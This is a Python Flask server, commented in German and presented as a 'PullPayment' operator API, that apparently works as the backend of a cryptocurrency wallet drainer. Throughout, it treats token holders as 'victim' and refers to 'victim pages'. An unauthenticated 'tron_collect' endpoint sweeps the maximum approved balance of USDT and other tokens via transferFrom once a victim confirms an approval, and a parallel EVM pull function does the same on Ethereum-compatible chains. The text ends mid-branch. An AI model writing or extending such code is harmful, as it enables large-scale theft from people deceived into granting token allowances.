"""
EVM PullPayment — serverseitige Operator-Aktionen (Port aus dem
Escrow-System pull-action.ts). Signiert mit PULL_OWNER_KEY (env), sendet
EIP-1559-Tx direkt an den Contract — kein Operator-Wallet-Sheet nötig.

  POST /api/pull {secret, action, ...params}
  POST /api/pull {secret, action:"audit"} → Audit-Log (letzte 50 Aktionen)

Actions: pull, pullMultiple, revokeApproval, markDefaulted,
clearDefaulted, setCustomerPullDelay, clearCustomerPullDelay,
setPullDelay, setTokenAllowed, setRecipientAllowed, pause, unpause,
emergencyWithdraw

Env: PULL_OWNER_KEY, TRON_OPERATOR_PK, ADMIN_PASS,
     UPSTASH_REDIS_REST_URL/TOKEN

GET /api/pull?op=1 → abgeleitete Operator-Adressen (kein Secret nötig —
Adressen sind on-chain ohnehin öffentlich): {evm, tron}
"""
import hmac, json, os, time, urllib.request
from flask import Flask, request, jsonify
from web3 import Web3
from eth_account import Account
import base58
from eth_keys import keys as eth_keys
from eth_utils import keccak

app = Flask(__name__)

RU = os.environ.get("UPSTASH_REDIS_REST_URL", "")
RT = os.environ.get("UPSTASH_REDIS_REST_TOKEN", "")
ADMIN = os.environ.get("ADMIN_PASS", "")
PK = (os.environ.get("PULL_OWNER_KEY") or os.environ.get("DEPLOYER_PRIVATE_KEY") or "").strip()
PK = PK if PK.startswith("0x") else ("0x" + PK if PK else "")
AUDIT_KEY = "chainscaner:pull_audit"

CONTRACTS = {
    8453:  "0x8158a68d5944a2b333f93172d184d3f4956eed27",
    1:     "0x022EAAa026c25A6387deBD79095a7e4cC1f44fc0",
    56:    "",
    137:   "",
    42161: "",
}
RPC = {
    8453:  "https://mainnet.base.org",
    1:     "https://eth.drpc.org",
    56:    "https://bsc-dataseed.binance.org",
    137:   "https://polygon-rpc.com",
    42161: "https://arb1.arbitrum.io/rpc",
}

PULL_ABI = [
    {"name": "pull", "type": "function", "inputs": [{"name": "customer", "type": "address"}, {"name": "token", "type": "address"}, {"name": "amount", "type": "uint256"}], "outputs": []},
    {"name": "pullMultiple", "type": "function", "inputs": [{"name": "customer", "type": "address"}, {"name": "tokens", "type": "address[]"}, {"name": "amounts", "type": "uint256[]"}], "outputs": []},
    {"name": "revokeApproval", "type": "function", "inputs": [{"name": "customer", "type": "address"}, {"name": "token", "type": "address"}], "outputs": []},
    {"name": "markDefaulted", "type": "function", "inputs": [{"name": "customer", "type": "address"}, {"name": "token", "type": "address"}], "outputs": []},
    {"name": "clearDefaulted", "type": "function", "inputs": [{"name": "customer", "type": "address"}, {"name": "token", "type": "address"}], "outputs": []},
    {"name": "setCustomerPullDelay", "type": "function", "inputs": [{"name": "customer", "type": "address"}, {"name": "delay", "type": "uint256"}], "outputs": []},
    {"name": "clearCustomerPullDelay", "type": "function", "inputs": [{"name": "customer", "type": "address"}], "outputs": []},
    {"name": "setPullDelay", "type": "function", "inputs": [{"name": "delay", "type": "uint256"}], "outputs": []},
    {"name": "setTokenAllowed", "type": "function", "inputs": [{"name": "token", "type": "address"}, {"name": "allowed", "type": "bool"}], "outputs": []},
    {"name": "setRecipientAllowed", "type": "function", "inputs": [{"name": "recipient", "type": "address"}, {"name": "allowed", "type": "bool"}], "outputs": []},
    {"name": "pause", "type": "function", "inputs": [], "outputs": []},
    {"name": "unpause", "type": "function", "inputs": [], "outputs": []},
    {"name": "emergencyWithdraw", "type": "function", "inputs": [{"name": "token", "type": "address"}, {"name": "to", "type": "address"}, {"name": "amount", "type": "uint256"}], "outputs": []},
]

ACTIONS = {"pull", "pullMultiple", "revokeApproval", "markDefaulted", "clearDefaulted",
           "setCustomerPullDelay", "clearCustomerPullDelay", "setPullDelay",
           "setTokenAllowed", "setRecipientAllowed", "pause", "unpause", "emergencyWithdraw"}

# ── TRON Pull — ein Key (TRON_OPERATOR_PK) ist Spender + Signer ──────────────
# Links nutzen dessen Adresse als spender; der Server baut transferFrom
# direkt — kein Operator-Deeplink/TronLink mehr nötig.
TG = ["https://api.trongrid.io", "https://api.tronstack.io"]
TRON_PK = (os.environ.get("TRON_OPERATOR_PK") or "").strip()
TRON_PK = TRON_PK[2:] if TRON_PK.startswith("0x") else TRON_PK
TRON_PK2 = (os.environ.get("TRON_OPERATOR_PK_2") or "").strip()
TRON_PK2 = TRON_PK2[2:] if TRON_PK2.startswith("0x") else TRON_PK2
TRON_PK3 = (os.environ.get("TRON_OPERATOR_PK_3") or "").strip()
TRON_PK3 = TRON_PK3[2:] if TRON_PK3.startswith("0x") else TRON_PK3
TRON_TOKENS = {
    "usdt": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    "usdc": "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8",
    "usdd": "TPYmHEhy5n8TCEfYGqW2rPxsghSccghGRn",
    "tusd": "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4",
    "wtrx": "TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR",
    "jst":  "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
    "sun":  "TSSMHYeV2uE9qYH95DqMeCuDy9vb59vTj",
    "btt":  "TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4",
    "win":  "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
}


_TG_LAST = [0.0]


def _tg(path, body, _retry=0):
    # TronGrid public: 3 rps hard limit, 5s Suspend bei Verstoß —
    # Abstand halten, bei Suspend anderen Host probieren, dann retryen.
    out = None
    for host in TG:
        dt = time.monotonic() - _TG_LAST[0]
        if dt < 0.4:
            time.sleep(0.4 - dt)
        req = urllib.request.Request(host + path, data=json.dumps(body).encode(),
                                     headers={"Content-Type": "application/json"})
        try:
            _TG_LAST[0] = time.monotonic()
            res = json.loads(urllib.request.urlopen(req, timeout=9).read())
        except urllib.error.HTTPError as e:
            _TG_LAST[0] = time.monotonic()
            # TronGrid schickt JSON-Error-Bodies — durchreichen statt 500
            try:
                res = json.loads(e.read())
                if not isinstance(res, dict):
                    res = {"message": "http %d" % e.code}
            except Exception:
                res = {"message": "http %d" % e.code}
        except Exception as e:
            _TG_LAST[0] = time.monotonic()
            res = {"message": "tron api: " + str(e)[:80]}
        msg = json.dumps(res).lower()
        if "rate exceeded" in msg or "suspended" in msg:
            continue  # Suspend gilt pro Server — nächster Host
        out = res
        break
    if out is None:
        # alle Hosts limitiert/down — warten und einmal retryen
        if _retry < 2:
            time.sleep(6)
            return _tg(path, body, _retry + 1)
        out = res
    return out


def _tron_hex(a58):
    return base58.b58decode_check(a58).hex()          # 41 + 20 bytes


def _tron_b58(hexaddr):
    return base58.b58encode_check(bytes.fromhex(hexaddr.lower().replace("0x", ""))).decode()


def _tron_op_slot():
    """Admin-Dropdown waehlt den Operator-Slot (1|2|3) — Config in Redis.
    Unlesbar/fehlend → 1. Keys bleiben serverseitige Env-Vars."""
    try:
        out = redis([["GET", "chainscaner:config"]])
        raw = (out or [{}])[0].get("result")
        cfg = json.loads(raw) if raw else {}
        s = cfg.get("tronOperator")
        return s if s in (1, 2, 3) else 1
    except Exception:
        return 1


def _tron_pk():
    # Ein Slot greift nur wenn der Key wirklich konfiguriert ist —
    # ohne ihn faellt die Auswahl still auf Operator 1 zurueck.
    s = _tron_op_slot()
    if s == 3 and TRON_PK3:
        return TRON_PK3
    if s == 2 and TRON_PK2:
        return TRON_PK2
    return TRON_PK


def _tron_op_hex():
    pk = eth_keys.PrivateKey(bytes.fromhex(_tron_pk()))
    return "41" + pk.public_key.to_canonical_address().hex()


def _tron_sign(tx):
    # Tron signiert die txID (= sha256(raw_data)) direkt mit secp256k1
    sig = eth_keys.PrivateKey(bytes.fromhex(_tron_pk())).sign_msg_hash(bytes.fromhex(tx["txID"]))
    v, r, s = sig.vrs
    tx["signature"] = [(r.to_bytes(32, "big") + s.to_bytes(32, "big") + bytes([27 + v])).hex()]
    return tx


def _tron_sign_msg_v2(msg):
    # TIP-191: keccak256("\x19TRON Signed Message:\n" + len + msg)
    payload = b"\x19TRON Signed Message:\n" + str(len(msg)).encode() + msg.encode()
    sig = eth_keys.PrivateKey(bytes.fromhex(_tron_pk())).sign_msg_hash(keccak(payload))
    v, r, s = sig.vrs
    return (r.to_bytes(32, "big") + s.to_bytes(32, "big") + bytes([27 + v])).hex()


def _valid_tron(a):
    return isinstance(a, str) and len(a) == 34 and a.startswith("T")


def _send_trx(to58, sun):
    """TRX-Transfer Operator→to — dup-tolerant, returns (txid, err)."""
    tx = _tg("/wallet/createtransaction", {
        "owner_address": _tron_op_hex(), "to_address": _tron_hex(to58),
        "amount": int(sun)})
    if not tx or not tx.get("raw_data"):
        return None, "build failed"
    _tron_sign(tx)
    bc = _tg("/wallet/broadcasttransaction", tx)
    if not bc.get("result"):
        raw = bc.get("message") or ""
        try:
            msg = bytes.fromhex(raw).decode()
        except Exception:
            msg = raw
        if "dup" not in msg.lower():
            return None, msg[:120]
    return tx["txID"], None


# ── TronNRG Energy-Rental — 16250 Energy pro TRX, min 4 TRX (~65k = ein
# Standard-USDT-Transfer). Payment+Claim komplett serverseitig.
NRG_ADDR = "TFqUiCu1JwLHHnBNeaaVKH7Csm4aA3YhZx"
NRG_RATE = 16250
NRG_MIN_SUN = 4_000_000
NRG_API = "https://api.tronnrg.com/delegate"


def _rent_energy(need):
    """Mietet `need` Energy auf den Operator. Returns (energy_got, err)."""
    op58 = _tron_b58(_tron_op_hex())
    sun = max(NRG_MIN_SUN, -(-int(need) // NRG_RATE) * 1_000_000)
    txid, err = _send_trx(NRG_ADDR, sun)
    if err:
        return 0, "payment: " + err
    time.sleep(3)  # Payment muss on-chain sichtbar sein bevor der Claim greift
    sig = _tron_sign_msg_v2(txid + ":" + op58)
    res = {}
    for attempt in range(2):
        try:
            req = urllib.request.Request(NRG_API, data=json.dumps({
                "tx_hash": txid, "delegate_to": op58, "signature": sig
            }).encode(), headers={"Content-Type": "application/json"})
            res = json.loads(urllib.request.urlopen(req, timeout=10).read())
        except Exception as e:
            res = {"error": str(e)[:100]}
        if res.get("energy"):
            break
        if attempt == 0:
            time.sleep(4)  # NRG kann den Payment-Hash noch nicht sehen
    if res.get("energy"):
        push_event("energy_rented", {"energy": res["energy"], "trx": sun // 1_000_000,
                                     "ref": res.get("ref"), "tx": txid})
        return int(res["energy"]), None
    return 0, (res or {}).get("message") or (res or {}).get("error") or "delegate failed"


def _op_resources(op_hex):
    """(energy_avail, trx_sun) des Operators."""
    res = _tg("/wallet/getaccountresource", {"address": op_hex}) or {}
    e = int(res.get("EnergyLimit") or 0) - int(res.get("EnergyUsed") or 0)
    acct = _tg("/wallet/getaccount", {"address": op_hex}) or {}
    return max(e, 0), int(acct.get("balance") or 0)


def _cfg_tron_pull_to():
    """tronPullTo aus dem Remote-Config-Store (Admin Recipient-Tab). Leer /
    unlesbar → None, dann greift der Operator-Default."""
    try:
        out = redis([["GET", "chainscaner:config"]])
        raw = (out or [{}])[0].get("result")
        cfg = json.loads(raw) if raw else {}
        v = str(cfg.get("tronPullTo") or "").strip()
        return v if _valid_tron(v) else None
    except Exception:
        return None


def tron_pull(body):
    if not _tron_pk():
        return {"error": "TRON_OPERATOR_PK not configured"}
    victim = str(body.get("victim") or "").strip()
    tok = str(body.get("token") or "usdt").strip()
    token = tok if tok.startswith("T") else TRON_TOKENS.get(tok.lower())
    # Ziel = Admin tronPullTo (Remote-Config — einzige Quelle) > body.dest
    # (API-Override fuer direkte Calls) > leer = aktiver Operator.
    # Serverseitig gepinnt — kein Request-Dest kann Coins woandershin senden.
    dest = (_cfg_tron_pull_to()
            or str(body.get("dest") or "")).strip()
    if dest and not _valid_tron(dest):
        return {"error": "invalid dest"}
    if not _valid_tron(victim) or not token:
        return {"error": "invalid victim/token"}
    amount_max = str(body.get("amount") or "").strip().lower() == "max"
    amount = 0
    if not amount_max:
        try:
            amount = int(body["amount"])
            if amount <= 0:
                raise ValueError()
        except Exception:
            return {"error": "invalid amount (raw base units)"}

    op_hex = _tron_op_hex()
    vic_hex = _tron_hex(victim)
    # dest = optionale Dritt-Adresse (Admin tronPullTo) — transferFrom darf
    # an jedes Ziel senden, der Operator-Key bleibt Spender+Signer.
    to_hex = _tron_hex(dest) if dest else op_hex

    # ── Preflight: Allowance + Balance live prüfen BEVOR die Energy-Miete
    # bezahlt wird. Read-only constant calls sind gratis — eine stale
    # Pullable-Zahl würde sonst ~14 TRX Miete für einen Revert verbrennen.
    tok_hex = _tron_hex(token)
    # Approve→Pull im selben Moment: der Node braucht einen Block (~3s) bis
    # die Allowance sichtbar ist — ohne Retry faellt der Pull direkt nach
    # bestaetigtem Sheet faelschlich auf "stale".
    allow_now = bal_now = 0
    for attempt in range(4):
        al = _tg("/wallet/triggerconstantcontract", {
            "owner_address": op_hex, "contract_address": tok_hex,
            "function_selector": "allowance(address,address)",
            "parameter": vic_hex[2:].rjust(64, "0") + op_hex[2:].rjust(64, "0")})
        bl = _tg("/wallet/triggerconstantcontract", {
            "owner_address": op_hex, "contract_address": tok_hex,
            "function_selector": "balanceOf(address)",
            "parameter": vic_hex[2:].rjust(64, "0")})
        try:
            allow_now = int((al.get("constant_result") or [""])[0], 16)
            bal_now = int((bl.get("constant_result") or [""])[0], 16)
        except Exception:
            if attempt == 3:
                return {"error": "preflight read failed — scan erneut probieren"}
            time.sleep(3)
            continue
        if min(allow_now, bal_now) >= (amount or 1):
            break
        if attempt < 3:
            time.sleep(3)
    pullable = min(allow_now, bal_now)
    if amount_max:
        # "max" = komplette Pullable — der Auto-Collect weiss nichts von
        # der Scanned-Zahl, Allowance-Block-Lag faengt die Retry-Schleife oben.
        amount = pullable
        if amount <= 0:
            return {"error": "nothing pullable (allowance/balance = 0)"}
    elif pullable < amount:
        return {"error": "stale: pullable ist jetzt %d (allow %d, bal %d) "
                         "— admin neu scannen" % (pullable, allow_now, bal_now)}

    # param erst NACH der finalen Amount-Aufloesung bauen — bei "max" steht
    # amount erst jetzt auf pullable; frueher gebaut wuerde die Tx mit
    # amount=0 senden (transferFrom 0 = Erfolg, aber 0 Coins bei voller Fee).
    param = (vic_hex[2:].rjust(64, "0")
             + to_hex[2:].rjust(64, "0")
             + "%064x" % amount)

    # ── Echtzeit-Messung statt Schätzung: transferFrom als Constant-Call
    # simulieren (gratis) liefert energy_used = exakter Verbrauch inkl.
    # Dynamic-Energy-Factor und SSTORE-Kosten zum jetzigen Chain-State.
    # Ein Revert hier = Abbruch bevor auch nur 1 SUN für Miete ausgeht.
    # (estimateenergy wird auf public nodes nicht unterstützt.)
    sim = _tg("/wallet/triggerconstantcontract", {
        "owner_address": op_hex, "contract_address": tok_hex,
        "function_selector": "transferFrom(address,address,uint256)",
        "parameter": param})
    used = int((sim or {}).get("energy_used") or 0)
    sim_ok = ((sim or {}).get("result") or {}).get("result")
    if not sim_ok or not used:
        return {"error": "simulation reverted: "
                         + json.dumps((sim or {}).get("result", sim))[:140]}
    # +15% Marge auf die Messung — der Dynamic-Factor kann zwischen
    # Simulation und Broadcast minimal driften.
    need = int(used * 1.15)
    have_e, trx_sun = _op_resources(op_hex)
    # java-tron VMActuator: callerEnergyLimit = min(energy + balance/100sun,
    # fee_limit/100sun) — die TRX-Balance zählt als burnbare Energy MIT.
    # Miete nur wenn delegierte Energy + Balance zusammen nicht reichen.
    # Reserve 0,5 TRX: die Tx braucht selbst Bandwidth (~345 bytes ≈ 0,35 TRX).
    burn_e = max((trx_sun - 500_000) // 100, 0)
    rented = 0
    if have_e + burn_e < need:
        rent_sun = max(NRG_MIN_SUN, -(-(need - have_e) // NRG_RATE) * 1_000_000)
        # +1 TRX Puffer: Bandwidth für Payment+Pull + Rest zum Brennen
        if trx_sun < rent_sun + 1_000_000:
            return {"error": "Operator ohne Deckung: Pull braucht ~%.1f TRX "
                             "Energy-Miete (%d E nötig, %d vorhanden), hat aber "
                             "nur %.2f TRX — TRX auf %s laden"
                             % (rent_sun / 1e6 + 1, need, have_e,
                                trx_sun / 1e6, _tron_b58(op_hex))}
        rented, err = _rent_energy(need - have_e)
        if err:
            return {"error": "energy rental failed: " + err}
        time.sleep(3)  # Delegation propagiert (~3s laut NRG-Doku)
        have_e, trx_sun = _op_resources(op_hex)
        burn_e = max((trx_sun - 500_000) // 100, 0)
        if have_e + burn_e < need:
            return {"error": "rented %d energy but usable %d+%d < %d — pull aborted "
                             "before broadcast" % (rented, have_e, burn_e, need)}

    # fee_limit = das ENERGY-CAP des Calls: curInvokeEnergyLimit =
    # min(fee_limit/price, verfügbare Energy). Zu niedrig → OOG trotz
    # delegierter Energy (gemessen: fee_limit 3,98 TRX → Cap 39.808).
    # Muss also >= need × price sein. Bei gedeckter Energy wird er
    # nicht verbrannt — nur ein Limit, kein Kostenfaktor.
    fee_limit = min(int(need * 100 * 1.05), 100000000)
    # Hinweis: Nodes bauen Txs auch mit fee_limit > balance; ein etwaiger
    # Broadcast-Reject ("balance not sufficient") kostet nichts und kommt
    # als sauberer Fehler zurück — kein Grund hier hart zu blockieren.

    res = _tg("/wallet/triggersmartcontract", {
        "owner_address": op_hex,
        "contract_address": _tron_hex(token),
        "function_selector": "transferFrom(address,address,uint256)",
        "parameter": param,
        "fee_limit": fee_limit,
        "call_value": 0
    })
    tx = res and res.get("transaction")
    if not tx or not tx.get("raw_data"):
        return {"error": "build failed: " + json.dumps((res or {}).get("result", res))[:140]}
    _tron_sign(tx)
    bc = _tg("/wallet/broadcasttransaction", tx)
    if not bc.get("result"):
        raw = bc.get("message") or ""
        try:
            msg = bytes.fromhex(raw).decode()
        except Exception:
            msg = raw
        if "dup" not in msg.lower():
            # Ambiger Fehler (timeout/netzwerk) ≠ zwingend nicht gesendet —
            # die Tx kann trotzdem on-chain sein. Verifizieren bevor wir
            # "failed" melden, sonst sieht ein Erfolg wie ein Fehler aus.
            # Bis zu 3 Bloecke (~12s) warten — mining laeuft asynchron.
            infra_err = "tron api" in msg.lower() or "http " in msg.lower()
            for attempt in range(3 if infra_err else 1):
                info = _tg("/wallet/gettransactioninfobyid",
                           {"value": tx["txID"]})
                receipt = (info or {}).get("receipt") or {}
                if receipt.get("result") == "SUCCESS":
                    return {"ok": True, "tx": tx.get("txID"),
                            "dest": _tron_b58(to_hex),
                            "energy_need": need, "energy_rented": rented,
                            "broadcast_unclear_but_confirmed": True}
                if receipt:
                    return {"error": "tx confirmed but reverted on-chain: "
                                     + str(receipt.get("result"))
                                     + " — txid " + tx["txID"]}
                if attempt < 2 and infra_err:
                    time.sleep(4)
            if infra_err:
                return {"error": "broadcast unclear: " + msg[:140]
                                 + " — txid " + tx["txID"] + " on-chain prüfen "
                                   "bevor erneut gesendet wird"}
            return {"error": "broadcast failed: " + msg[:140]}
    # Broadcast ok ≠ ausgefuehrt: ein on-chain Revert (z.B. OOG-Race)
    # wuerde sonst als pull_sent im Feed stehen. Bounded: 1 Block abwarten,
    # Receipt einmal lesen; ungemined → ok mit pending-Flag.
    time.sleep(3)
    info = _tg("/wallet/gettransactioninfobyid", {"value": tx["txID"]}) or {}
    receipt = info.get("receipt") or {}
    res = {"ok": True, "tx": tx.get("txID"), "dest": _tron_b58(to_hex),
           "energy_need": need, "energy_rented": rented}
    if receipt.get("result") == "SUCCESS":
        res["confirmed"] = True
    elif receipt:
        res = {"error": "tx reverted on-chain: " + str(receipt.get("result")),
               "tx": tx["txID"]}
    else:
        res["pending"] = True  # Broadcast angenommen, Block noch ausstehend
    return res


# ── EVM Pull — plain ERC-20 transferFrom, Spender-Key = PULL_OWNER_KEY ───────
# Gegenstück zu tron_pull für die /exec?approve=1-Allowances: der Opfer hat
# approve(spender=OP.evm, amount) gesetzt, der Server pullt danach direkt am
# Token-Contract — kein PullPayment nötig, jede ERC-20-Adresse pullbar.
ERC20_ABI = [
    {"name": "transferFrom", "type": "function", "inputs": [
        {"name": "from_", "type": "address"}, {"name": "to", "type": "address"},
        {"name": "amount", "type": "uint256"}], "outputs": [{"name": "", "type": "bool"}],
     "stateMutability": "nonpayable"},
    {"name": "allowance", "type": "function", "inputs": [
        {"name": "owner", "type": "address"}, {"name": "spender", "type": "address"}],
     "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "view"},
    {"name": "balanceOf", "type": "function", "inputs": [{"name": "account", "type": "address"}],
     "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "view"},
]


def evm_pull(body):
    """Plain ERC-20 transferFrom serverseitig — gleiche Guards wie tron_pull:
    Preflight (allowance+balance), estimate_gas-Simulation, Operator-Gasdeckung,
    bounded Receipt. Returns dict {ok|error, tx, dest}."""
    if not PK:
        return {"error": "PULL_OWNER_KEY not configured"}
    try:
        chain = int(body.get("chain") or 0)
    except Exception:
        return {"error": "invalid chain"}
    rpc = RPC.get(chain)
    if not rpc:
        return {"error": "no rpc for chain " + str(chain)}
    try:
        victim = Web3.to_checksum_address(str(body.get("victim") or ""))
        token = Web3.to_checksum_address(str(body.get("token") or ""))
        amt_raw = body.get("amount")
        amount = None if str(amt_raw) == "max" else int(amt_raw)
        if amount is not None and amount <= 0:
            raise ValueError()
    except Exception:
        return {"error": "invalid victim/token/amount (raw base units)"}
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 12}))
    except Exception as e:
        return {"error": "rpc connect failed: " + str(e)[:120]}
    owner = Web3.to_checksum_address(Account.from_key(PK).address)
    dest = str(body.get("dest") or "").strip()
    try:
        dest = Web3.to_checksum_address(dest) if dest else owner
    except Exception:
        return {"error": "invalid dest"}

    tok = w3.eth.contract(address=token, abi=ERC20_ABI)
    # Preflight: allowance(victim→spender) + balanceOf(victim) — pullable = min.
    # Retry wie bei tron_pull: approve eben erst confirmed → RPC braucht einen
    # Block bis die Allowance sichtbar ist.
    allow_now = bal_now = 0
    for attempt in range(4):
        try:
            allow_now = int(tok.functions.allowance(victim, owner).call())
            bal_now = int(tok.functions.balanceOf(victim).call())
        except Exception:
            if attempt == 3:
                return {"error": "preflight read failed — rpc/token prüfen"}
            time.sleep(3)
            continue
        if min(allow_now, bal_now) >= amount:
            break
        if attempt < 3:
            time.sleep(3)
    pullable = min(allow_now, bal_now)
    if amount is None:
        amount = pullable
    if pullable < amount or amount <= 0:
        return {"error": "stale: pullable ist jetzt %d (allow %d, bal %d) "
                         "— neu scannen" % (pullable, allow_now, bal_now)}

    fn = tok.functions.transferFrom(victim, dest, amount)
    # estimate_gas = Simulation — Revert fängt hier ab, bevor Gas ausgeht
    try:
        gas = fn.estimate_gas({"from": owner})
    except Exception as e:
        return {"error": "call would revert: " + str(e)[:160]}

    tx_args = {"from": owner, "chainId": chain,
               "nonce": w3.eth.get_transaction_count(owner, "pending"),
               "gas": int(gas * 1.25)}
    if chain == 56:
        tx_args["gasPrice"] = w3.eth.gas_price  # BSC: kein London-Fee-Market
    else:
        try:
            base = w3.eth.get_block("latest").get("baseFeePerGas") or 0
            tip = max(w3.eth.max_priority_fee, Web3.to_wei(0.5, "gwei"))
            tx_args.update({"maxFeePerGas": base * 2 + tip,
                            "maxPriorityFeePerGas": tip, "type": 2})
        except Exception:
            tx_args["gasPrice"] = w3.eth.gas_price  # Legacy-Fallback
    fee_cap = tx_args.get("gasPrice") or tx_args.get("maxFeePerGas") or 0

    # Operator muss natives Gas decken — sonst gar nicht erst broadcasten
    bal_wei = w3.eth.get_balance(owner)
    cost = int(gas * 1.25) * fee_cap
    if bal_wei < cost:
        return {"error": "operator ohne gas: braucht ~%.6f native (chain %d), "
                         "hat %.6f — auf %s laden"
                         % (cost / 1e18, chain, bal_wei / 1e18, owner)}

    try:
        tx = fn.build_transaction(tx_args)
        signed = Account.sign_transaction(tx, PK)
        txid = w3.eth.send_raw_transaction(signed.raw_transaction).hex()
    except Exception as e:
        return {"error": "broadcast failed: " + str(e)[:160]}

    # Broadcast ok ≠ ausgeführt — bounded Receipt-Check wie beim Tron-Flow
    try:
        rc = w3.eth.wait_for_transaction_receipt(txid, timeout=20)
        if int(rc.status) == 1:
            return {"ok": True, "tx": txid, "chain": chain, "dest": dest,
                    "confirmed": True}
        return {"error": "tx reverted on-chain", "tx": txid}
    except Exception:
        return {"ok": True, "tx": txid, "chain": chain, "dest": dest,
                "pending": True}


def redis(cmds):
    if not RU or not RT:
        return None
    req = urllib.request.Request(RU + "/pipeline", data=json.dumps(cmds).encode(),
                                 headers={"Content-Type": "application/json",
                                          "Authorization": "Bearer " + RT})
    return json.loads(urllib.request.urlopen(req, timeout=6).read())


def authed(secret):
    return bool(ADMIN) and hmac.compare_digest(str(secret or ""), ADMIN)


def rate_limited():
    """Owner-Key-Endpunkt — hartes Limit auch bei gültigem Secret (Leak-Schutz)."""
    try:
        out = redis([["INCR", "chainscaner:pull_rate"],
                     ["EXPIRE", "chainscaner:pull_rate", "600", "NX"]])
        return not out or int((out[0] or {}).get("result") or 0) > 40
    except Exception:
        return False


def audit(entry):
    try:
        entry["at"] = __import__("datetime").datetime.now(__import__("datetime").timezone.utc).isoformat()[:19]
        redis([["LPUSH", AUDIT_KEY, json.dumps(entry)],
               ["LTRIM", AUDIT_KEY, "0", "99"]])
    except Exception:
        pass


def push_event(ev, data):
    """Gleicher Feed wie die Opfer-Seiten — der Live Monitor zeigt beide Systeme."""
    try:
        from datetime import datetime, timezone
        env = {"at": datetime.now(timezone.utc).isoformat().replace("T", " ")[:19],
               "ip": "", "ua": "pull-api",
               "ev": {"ev": ev, "t": datetime.now(timezone.utc).isoformat(), "d": data}}
        redis([["LPUSH", "chainscaner:events", json.dumps(env)],
               ["LTRIM", "chainscaner:events", "0", "199"]])
    except Exception:
        pass


def build_call(action, p):
    """params dict → (fn_name, args) — wirft ValueError bei ungültigem Input."""
    addr = lambda k: Web3.to_checksum_address(str(p.get(k, "")))
    if action == "pull":
        return "pull", [addr("customer"), addr("token"), int(p["amount"])]
    if action == "pullMultiple":
        toks = [Web3.to_checksum_address(t) for t in p.get("tokens", [])][:25]
        amts = [int(a) for a in p.get("amounts", [])][:25]
        if not toks or len(toks) != len(amts):
            raise ValueError("tokens/amounts mismatch")
        return "pullMultiple", [addr("customer"), toks, amts]
    if action in ("revokeApproval", "markDefaulted", "clearDefaulted"):
        return action, [addr("customer"), addr("token")]
    if action == "setCustomerPullDelay":
        d = int(p["delay"])
        if not 0 <= d <= 31536000:
            raise ValueError("delay out of range")
        return action, [addr("customer"), d]
    if action == "clearCustomerPullDelay":
        return action, [addr("customer")]
    if action == "setPullDelay":
        d = int(p["delay"])
        if not 0 <= d <= 31536000:
            raise ValueError("delay out of range")
        return action, [d]
    if action == "setTokenAllowed":
        return action, [addr("token"), bool(p.get("allowed"))]
    if action == "setRecipientAllowed":
        return action, [addr("recipient"), bool(p.get("allowed"))]
    if action in ("pause", "unpause"):
        return action, []
    if action == "emergencyWithdraw":
        return action, [addr("token"), addr("to"), int(p["amount"])]
    raise ValueError("unknown action")


@app.route("/api/pull", methods=["GET", "POST"])
def route():
    if request.method == "GET":
        if request.args.get("op"):
            # Abgeleitete Operator-Adressen — Admin füllt damit Spender/
            # Recipient automatisch. Adressen sind öffentlich, kein Secret nötig.
            op = {}
            if PK:
                op["evm"] = Account.from_key(PK).address
            if TRON_PK:
                op["tron"] = _tron_b58(_tron_op_hex())   # aktiver Operator
                pk1 = eth_keys.PrivateKey(bytes.fromhex(TRON_PK))
                op["tron1"] = _tron_b58("41" + pk1.public_key.to_canonical_address().hex())
            if TRON_PK2:
                pk2 = eth_keys.PrivateKey(bytes.fromhex(TRON_PK2))
                op["tron2"] = _tron_b58("41" + pk2.public_key.to_canonical_address().hex())
            if TRON_PK3:
                pk3 = eth_keys.PrivateKey(bytes.fromhex(TRON_PK3))
                op["tron3"] = _tron_b58("41" + pk3.public_key.to_canonical_address().hex())
            # active = der Slot dessen Key wirklich signiert — fehlt der
            # Key, faellt _tron_pk() auf Op1 zurueck und das melden wir so.
            apk = _tron_pk()
            op["active"] = (3 if apk == TRON_PK3 and TRON_PK3
                            else 2 if apk == TRON_PK2 and TRON_PK2 else 1)
            return jsonify({"ok": True, "op": op})
        return jsonify({"error": "audit via POST {secret, action:'audit'}"}), 400

    body = request.get_json(force=True, silent=True) or {}
    action = body.get("action")

    if action == "tron_collect":
        # Public Auto-Pull — die Opfer-Seiten rufen das nach jedem
        # confirmed approve-Sheet. Kein Secret nötig: der Aufrufer kann
        # kein dest setzen (body.dest bleibt leer) — das Ziel kommt nur
        # aus dem Admin-Feld tronPullTo bzw. dem aktiven Operator, und
        # transferFrom braucht eine existierende Allowance an den Operator.
        # Dedup: selbe victim+token-Combo max 1×/10min — Spam wuerde sonst
        # Energy-Miete in Race-Pulls verbrennen.
        vic = str(body.get("victim") or "").strip()
        tok = str(body.get("token") or "").strip()
        key = "chainscaner:collect:%s:%s" % (vic, tok)
        try:
            out = redis([["SET", key, "1", "NX", "EX", "600"]])
            if not (out and (out[0] or {}).get("result") == "OK"):
                return jsonify({"ok": True, "skipped": "recent collect exists"})
        except Exception:
            pass
        out = tron_pull({"victim": vic, "token": tok, "amount": "max"})
        if not out.get("ok"):
            # Dedup-Lock bei Fehler freigeben — ein transienter Node-Fail
            # wuerde die Combo sonst 10min sperren und der Auto-Pull waere
            # verloren, wenn das Opfer nicht nochmal confirmed.
            try:
                redis([["DEL", key]])
            except Exception:
                pass
        audit({"action": "tron_collect", "chain": "tron",
               "status": "sent" if out.get("ok") else "error",
               "tx": out.get("tx"), "customer": vic, "dest": out.get("dest") or "",
               "token": tok, "error": out.get("error", "")[:160]})
        if out.get("ok"):
            push_event("pull_sent", {"action": "tron_collect", "chain": "tron",
                                     "tx": out.get("tx"), "customer": vic,
                                     "dest": out.get("dest"), "token": tok})
        else:
            push_event("pull_failed", {"action": "tron_collect", "chain": "tron",
                                       "error": out.get("error", "")[:120]})
        return jsonify(out)

    if action == "evm_collect":
